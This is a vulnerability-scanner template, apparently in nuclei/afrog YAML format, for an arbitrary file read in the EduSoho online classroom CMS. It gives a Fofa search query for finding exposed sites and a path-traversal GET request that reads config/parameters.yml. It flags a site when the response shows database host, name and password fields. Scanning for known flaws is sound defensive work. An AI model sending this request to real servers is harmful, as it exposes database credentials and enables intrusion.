id: edusohu-classroom-course-statistics-fileread

info:
  name: Edusoho网络课堂cms存在任意文件读取
  author: zan8in
  severity: high
  verified: true
  description: |-
    Edusoho网络课堂是面向个人、学校、培训机构及企业用户的友好、开源、高性价比的在线教育建站系统。Edusoho网络课堂存在任意文件读取漏洞
    Fofa: title="EduSoho"
  reference:
    - https://mp.weixin.qq.com/s/NPpLQI7eET1NR2FHIJfNww
  tags: edusoho,fileread
  created: 2024/02/28

rules:
  r0:
    request:
      method: GET
      path: /export/classroom-course-statistics?fileNames[]=../../../config/parameters.yml
    expression: |
      response.status == 200 && 
      response.body.bcontains(b'parameters:') &&
      response.body.bcontains(b'database_driver:') &&
      response.body.bcontains(b'database_host:') &&
      response.body.bcontains(b'database_port:') &&
      response.body.bcontains(b'database_name:') &&
      response.body.bcontains(b'database_password:')
expression: r0()
